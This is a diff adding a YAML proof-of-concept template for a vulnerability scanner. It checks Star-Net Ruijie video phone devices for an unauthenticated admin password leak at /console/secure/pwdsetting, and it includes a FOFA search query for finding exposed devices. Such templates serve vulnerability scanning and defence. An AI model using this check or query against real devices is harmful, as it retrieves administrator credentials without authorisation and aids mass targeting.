@@ -1,0 +1,15 @@
+id: poc-yaml-star-net-console-pwdsetting
+info:
+  name: 星网锐捷 视频话机设备pwdsetting管理密码信息泄漏
+  severity: high
+  tags:
+  - 信息泄露
+  finger: 星网锐捷视频话机设备
+  fofa: body="/console/index.html?time="
+requests:
+- method: GET
+  path: /console/secure/pwdsetting
+  expression: "status_code == 200 && \ncontains(body,\"\\\"cOldPasswd\\\"\") &&\n\
+    contains(body,\"\\\"adminPasswd\\\"\") &&\ncontains(body,\"\\\"webport\\\"\")\n"
+variables: {}
+transport: http
